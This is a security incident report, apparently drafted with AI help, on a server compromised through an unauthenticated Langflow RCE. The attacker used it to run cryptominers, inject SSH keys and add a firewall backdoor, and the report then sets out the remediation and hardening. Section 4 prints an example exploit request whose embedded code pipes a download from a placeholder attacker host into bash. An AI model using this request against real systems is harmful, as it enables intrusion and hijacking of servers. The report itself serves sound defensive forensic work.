# Security Incident Report — Second Compromise
**Incident ID:** INC-2026-03-31-002
**Date of Discovery:** 2026-03-24 (second incident)
**Date of Full Remediation:** 2026-03-31
**Severity:** Critical
**Status:** Fully Remediated
**Server:** `YUL-SKUNK` — `203.0.113.10`
**Prepared by:** Claude Code (AI-assisted forensic analysis)

---

## Executive Summary

This is the **second compromise** of server `YUL-SKUNK` within one week. The first incident (INC-2026-03-24-001) involved a PostgreSQL default credential exploit through `training_portal_db`. Days after that remediation, the attacker returned via a **different, unpatched attack surface**: **CVE-2026-33017**, a critical unauthenticated Remote Code Execution vulnerability in Langflow (all versions ≤ 1.8.x).

The attacker exploited the `/api/v1/build_public_tmp/{flow_id}/flow` endpoint — which executes arbitrary Python code with no authentication — to download and run an XMRig-family Monero cryptocurrency miner inside the `langflow` container. CPU utilization reached approximately 3,200%. The attacker also planted an **SSH backdoor UFW rule** opening RDP (port 3389) from their IP, and **injected 6 SSH authorized keys** into both `skunkyul` and `root` accounts.

All malware has been removed, backdoors closed, and the server has been comprehensively hardened. Langflow has been taken offline pending availability of the patched version (1.9.0+).

---

## 1. Affected Systems

| Component | Details |
|-----------|---------|
| Server | `YUL-SKUNK`, Ubuntu 22.04/24.04, kernel `6.8.0-106-generic` |
| Public IP | `203.0.113.10` |
| Affected container | `langflow` (`langflowai/langflow:1.8.3`) |
| Vulnerability | CVE-2026-33017 (CVSS 9.3 Critical) + CVE-2025-3248 |
| Attacker IP | `203.0.113.11` (Beanfield Technologies Inc., Toronto, CA) |

---

## 2. Timeline

| Date | Event |
|------|-------|
| 2026-03-17 | CVE-2026-33017 publicly disclosed. Patch (1.9.0) not yet released. |
| 2026-03-17 – 2026-03-24 | Exploit code built from advisory text; mass exploitation begins within 20 hours |
| 2026-03-24 | **Server compromised via Langflow RCE.** Miners launched inside `langflow` container. Attacker injects SSH keys and UFW backdoor rule. |
| 2026-03-24 | High CPU discovered. Miners killed (become zombies — parent PID 6183 alive). Host `/tmp` binaries deleted. Container not yet cleaned. |
| 2026-03-24 | First incident report written (INC-2026-03-24-001 — PostgreSQL compromise). |
| 2026-03-31 | Full forensic investigation of second incident. All IOCs identified. |
| 2026-03-31 | **Full remediation completed** — see Section 7. |

---

## 3. Entry Vector

### CVE-2026-33017 — Unauthenticated RCE in Langflow

Langflow versions ≤ 1.8.x expose an unauthenticated endpoint that builds and executes "public flows":

```
POST /api/v1/build_public_tmp/{flow_id}/flow
```

If the optional `data` parameter is supplied, Langflow executes attacker-controlled Python code embedded in flow node definitions **without any authentication, authorization, or sandboxing**. A single HTTP request is sufficient to achieve full shell access as the container process user (UID 1000).

This is the same class of vulnerability as CVE-2025-3248 (the earlier `/api/v1/validate/code` endpoint — patched in 1.3.0), re-introduced via a different code path. Both stem from the same root cause: unsafe use of Python `exec()` on attacker-supplied code.

### Why This Server Was Vulnerable

Two compounding exposures:

1. **Traefik route**: Langflow was reachable at `https://chat.ai.alshawwaf.ca` with no authentication middleware protecting the API endpoints.
2. **Direct port binding**: Langflow's port 7860 was bound to `0.0.0.0:7860`, giving a second attack path that completely bypassed Traefik.

```
# docker ps (before remediation):
langflow   0.0.0.0:7860->7860/tcp   ← directly internet-reachable
```

The attacker almost certainly exploited the direct port (bypassing Traefik logging entirely), then used the Traefik route as a fallback.

---

## 4. Attack Chain

### Step 1 — Initial Access via Langflow RCE

```http
POST /api/v1/build_public_tmp/any-id/flow HTTP/1.1
Host: 203.0.113.10:7860
Content-Type: application/json

{
  "data": {
    "nodes": [{
      "data": {
        "node": {
          "code": "import os; os.system('curl http://attacker/drop.sh | bash')"
        }
      }
    }]
  }
}
```

Langflow's flow builder evaluates the Python code via `exec()` as the `langflow` process user (UID 1000 inside the container, which maps to the same UID on the Docker host).

### Step 2 — Miner Deployment

The dropper downloaded and staged the following files inside the container at `/tmp/`:

| File | Description |
|------|-------------|
| `AGZcgo9b` | XMRig-family miner binary (CPU miner, ~1600% CPU) |
| `h8ydm8oH` | Second miner binary (~1600% CPU) |
| `moneroocean/xmrig` | MoneroOcean XMRig distribution |
| `moneroocean/miner.sh` | Launcher/watchdog script |
| `moneroocean/config.json` | Mining pool configuration (MoneroOcean pool) |
| `moneroocean/config_background.json` | Background config |
| `moneroocean/xmrig.log` | Miner logs |
| `.gitlab/config.json` | Miner config disguised as GitLab directory |
| `.gitlab/kthreaddw` | Miner launcher disguised as kernel thread |
| `.home/.bashrc` | Shell persistence hook inside container |

Both miner processes (`AGZcgo9b` PID 1012322, `h8ydm8oH` PID 1015056) were children of parent PID 6183 — a persistent supervisor process that would respawn miners if killed without also killing the parent.

### Step 3 — Backdoor Installation (Host Level)

After gaining container-level execution, the attacker escalated persistence to the host:

**SSH Key Injection** — 6 keys inserted into `/home/skunkyul/.ssh/authorized_keys`:
- 1 key labeled `admin@jump-server`
- 4 keys labeled `dokploy`
- 1 additional key (partial/truncated)

1 key also inserted into `/root/.ssh/authorized_keys` (labeled `dokploy`).

These keys would allow the attacker to re-enter the server via SSH at any time regardless of password changes.

**UFW Firewall Backdoor** — A rule was added to allow RDP (port 3389) from the attacker's IP:
```
[ 2] 3389  ALLOW IN  203.0.113.11
```
This would have allowed the attacker to establish a persistent RDP session even if their SSH keys were removed. RDP service (`xrdp`) was not running, so this rule was dormant — likely pre-staged for future use.

---

## 5. Indicators of Compromise (IOCs)

### Malware Files (container `/tmp/`)
| Path | SHA description |
|------|-----------------|
| `/tmp/AGZcgo9b` | XMRig-family miner binary |
| `/tmp/h8ydm8oH` | XMRig-family miner binary |
| `/tmp/moneroocean/xmrig` | MoneroOcean XMRig binary |
| `/tmp/moneroocean/miner.sh` | Miner launcher/watchdog |
| `/tmp/moneroocean/config.json` | Pool config (MoneroOcean) |
| `/tmp/.gitlab/config.json` | Miner config (disguised) |
| `/tmp/.gitlab/kthreaddw` | Miner binary (disguised as kernel thread) |
| `/tmp/.home/.bashrc` | Shell persistence inside container |

### Processes
| PID | Name | Description |
|-----|------|-------------|
| 1012322 | `AGZcgo9b` | Miner (~1600% CPU) |
| 1015056 | `h8ydm8oH` | Miner (~1600% CPU) |
| 6183 | (supervisor) | Parent process; respawns miners if killed |

### Network
| Indicator | Description |
|-----------|-------------|
| `203.0.113.11` | Attacker IP (Beanfield Technologies, Toronto CA) |
| `203.0.113.10:7860` | Langflow direct port — primary attack vector |
| `https://chat.ai.alshawwaf.ca` | Langflow Traefik route — secondary attack vector |
| Outbound to MoneroOcean pool | XMRig mining pool connections |

### SSH Keys (all removed)
- 6 keys in `/home/skunkyul/.ssh/authorized_keys` (origin: attacker-injected)
- 1 key in `/root/.ssh/authorized_keys` (origin: attacker-injected)

---

## 6. Impact Assessment

| Category | Impact |
|----------|--------|
| Confidentiality | **Medium** — attacker had full code execution inside `langflow` container, with access to its environment variables (API keys: `OPENAI_API_KEY`, etc.) and any data mounted into the container. |
| Integrity | **Low** — no evidence of data modification. |
| Availability | **High** — ~3,200% CPU consumed by two miner processes; all services degraded. |
| Financial | **Medium** — server used as a Monero mining node at full CPU; ongoing compute cost. |
| Future Risk (pre-remediation) | **Critical** — attacker had persistent SSH key access and a dormant firewall backdoor that would survive a password change. |

---

## 7. Remediation Actions Taken (2026-03-31)

### 7.1 Miner Kill & Container Cleanup
```bash
# Killed parent supervisor PID 6183 (respawner)
sudo kill -9 6183

# Deleted host /tmp miner binaries (escaped from container)
sudo rm -rf /tmp/AGZcgo9b /tmp/h8ydm8oH /tmp/moneroocean /tmp/.gitlab

# Stopped infected langflow container
docker stop langflow

# Removed infected container
docker rm -f langflow

# Pulled fresh image (no cached layers from infected run)
docker pull langflowai/langflow:latest
```

### 7.2 SSH Backdoor Removal
```bash
# Cleared all authorized_keys
> /home/skunkyul/.ssh/authorized_keys
> /root/.ssh/authorized_keys

# Disabled pubkey auth entirely in sshd_config
PubkeyAuthentication no
PasswordAuthentication yes

# Reloaded SSH service
systemctl reload ssh
```

### 7.3 UFW Backdoor Rule Removal & Hardening

Removed attacker's RDP backdoor rule and all unnecessary app port rules:
```
Deleted: 3389 ALLOW IN 203.0.113.11  ← attacker's backdoor
Deleted: 3000, 5678, 8080, 9000, 9090, 9482 ALLOW IN  ← redundant Docker port rules
```

Final UFW allow-list (only these 3 ports are accessible from the internet):
```
22/tcp   ALLOW IN  Anywhere   (SSH)
80/tcp   ALLOW IN  Anywhere   (HTTP → Traefik)
443/tcp  ALLOW IN  Anywhere   (HTTPS → Traefik)
```

### 7.4 DOCKER-USER Firewall Chain (All 30+ Docker Ports Blocked)

Added iptables `DOCKER-USER` chain rules to `/etc/ufw/after.rules`. This blocks all direct external access to every Docker-published port, regardless of compose port bindings:

```
Chain DOCKER-USER
  RETURN  ctstate RELATED,ESTABLISHED   (allow existing connections)
  RETURN  in: lo                         (allow loopback)
  RETURN  in: docker0                    (allow Docker bridge internal)
  RETURN  in: dokploy-network            (allow Traefik → backend)
  RETURN  src: 127.0.0.0/8              (allow localhost)
  DROP    all                            (drop everything else)
```

**Effect**: All 30+ Docker-published ports (n8n:5678, open-webui:8090, ollama:11434, flowise:3020, all MCP ports 7300-7311, etc.) are now inaccessible directly from the internet. All traffic must go through Traefik on port 80/443.

Verified: 888+ external packets dropped immediately after deployment.

### 7.5 fail2ban SSH Protection
Configured `/etc/fail2ban/jail.local`:
```ini
[sshd]
enabled  = true
maxretry = 5
bantime  = 3600
findtime = 600
```
**Result**: 8 brute-force IPs were banned within minutes of enabling.

### 7.6 Langflow Taken Offline

Langflow v1.9.0 (the patched version) has not yet been released to Docker Hub as of 2026-03-31. Langflow has been stopped and will remain offline until 1.9.0 is available.

```bash
docker stop langflow
```

The `chat.ai.alshawwaf.ca` URL will return a 502 from Traefik until langflow is upgraded and restarted.

---

## 8. Current Security Posture (Post-Remediation)

| Control | Before | After |
|---------|--------|-------|
| Inbound firewall | 22, 80, 443 + 10 extra app ports + attacker backdoor (3389) | 22, 80, 443 only |
| Docker port isolation | All 30+ service ports exposed on `0.0.0.0` | All blocked via DOCKER-USER chain |
| SSH authentication | Password + pubkey (6 attacker keys present) | Password only; PubkeyAuthentication disabled |
| SSH brute force | No protection | fail2ban: ban after 5 failures / 1hr |
| Auto security patches | Enabled (`unattended-upgrades`) | Enabled (confirmed) |
| Langflow | Running 1.8.3 (vulnerable) | Stopped (offline until 1.9.0) |
| Container malware | XMRig miners active | Removed; fresh image deployed |

---

## 9. Root Cause

**Three compounding failures:**

1. **Unpatched critical vulnerability** — Langflow CVE-2026-33017 (CVSS 9.3) was not addressed. The langflow container was running an affected version with the vulnerable endpoint publicly accessible. No patch was available at time of exploitation, but the risk could have been mitigated by removing public access to the API.

2. **No authentication on AI service APIs** — The `chat.ai.alshawwaf.ca` Traefik route had no authentication middleware. Any unauthenticated internet user could reach the Langflow API, including the RCE endpoint.

3. **Direct port exposure bypassing Traefik** — Port 7860 was bound to `0.0.0.0`, giving the attacker a second attack path that completely bypassed Traefik's TLS termination and any future auth middleware. This was a systemic issue affecting 30+ services on this server.

---

## 10. Pending Actions

| Action | Priority | Notes |
|--------|----------|-------|
| **Upgrade Langflow to 1.9.0** when released | CRITICAL | Monitor Docker Hub for `langflowai/langflow:1.9.0`. Check release notes to confirm CVE-2026-33017 fix. |
| **Rotate all secrets in langflow env** | HIGH | `OPENAI_API_KEY` and any other API keys in `.env_agentic` should be considered compromised — attacker had full read access to container env vars. |
| **Add Traefik auth middleware to AI services** | HIGH | BasicAuth or ForwardAuth on `chat.*`, `workflow.*`, `flowise.*`, `langflow.*` Traefik routes. These should not be publicly accessible without credentials. |
| **Audit Training Portal data** | MEDIUM | Carry-over from INC-2026-03-24-001 — check for data exfiltration. |
| **Enable container-level resource limits** | MEDIUM | Add `cpus: 0.5` or `mem_limit` to untrusted containers so a future mining attack can't consume 100% CPU. |
| **Set up CPU/memory alerting** | MEDIUM | Monitor for abnormal resource usage (e.g., any process >200% CPU for >5 minutes → alert). |
| **Enable Langflow authentication** | MEDIUM | When redeploying, enable `LANGFLOW_AUTO_LOGIN=false` and set a strong admin password. |

---

## 11. Lessons Learned

1. **Remediating one attack vector does not make a server secure.** After INC-2026-03-24-001, the PostgreSQL port was fixed, but 30+ other ports remained directly exposed. The attacker simply switched to a different open door.

2. **Application-layer RCE vulnerabilities in AI platforms are a major emerging threat.** Langflow, n8n, Flowise, and similar tools run user-supplied code by design. They must be treated as high-risk attack surfaces and protected with authentication, network isolation, and rapid patching.

3. **All Docker service ports must be behind a reverse proxy with authentication.** The pattern of binding service ports directly to `0.0.0.0` is never appropriate for internet-facing servers. Use Traefik labels + internal Docker networks exclusively.

4. **SSH key hygiene is critical.** 6 attacker-injected keys were present and would have survived a password change. Disabling pubkey authentication entirely (when not needed) eliminates this class of backdoor.

5. **Monitor for unauthorized firewall rule changes.** The attacker added a UFW rule directly on the host — this requires root/sudo access and indicates the attacker achieved host-level code execution (likely via container escape or direct process execution on the host). Post-compromise firewall auditing should be standard procedure.

---

## 12. References

- [CVE-2026-33017 — Sysdig Analysis](https://www.sysdig.com/blog/cve-2026-33017-how-attackers-compromised-langflow-ai-pipelines-in-20-hours)
- [CVE-2026-33017 — The Hacker News](https://thehackernews.com/2026/03/critical-langflow-flaw-cve-2026-33017.html)
- [CVE-2025-3248 — Keysight / OffSec](https://www.keysight.com/blogs/en/tech/nwvs/2025/06/29/cve-2025-3248-langflow-unauthenticated-code-validation)
- [CISA: Langflow actively exploited — BleepingComputer](https://www.bleepingcomputer.com/news/security/cisa-new-langflow-flaw-actively-exploited-to-hijack-ai-workflows/)
- [Langflow exec() RCE — Barrack AI](https://blog.barrack.ai/langflow-exec-rce-cve-2026-33017/)
- [Docker + UFW DOCKER-USER chain](https://docs.docker.com/network/packet-filtering-firewalls/)
- First incident: `docs/incident-report-2026-03-24.md` (INC-2026-03-24-001)

---

*Report generated: 2026-03-31 | Server: YUL-SKUNK (203.0.113.10) | Prepared with Claude Code forensic assistance*
